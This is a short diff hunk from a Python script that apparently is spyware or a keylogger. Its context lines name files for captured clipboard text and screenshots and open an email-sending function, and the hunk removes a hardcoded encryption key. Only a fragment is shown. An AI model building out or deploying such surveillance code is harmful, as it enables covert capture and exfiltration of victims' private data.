@@ -39,9 +39,6 @@ clipboard_info = "clipboard.txt"
 # variable declaration for screenshot
 screenshot_info = "screenshot.png"
 
-# decrypt variable declaration
-key = "7LBG7bqMkRqedGjS3h717rgono_TlKbRaxZVBzGCZXM="
-
 # sending email functionality 
 def send_email(filename, attachment, toaddr, subject):
     from_addr = email_address
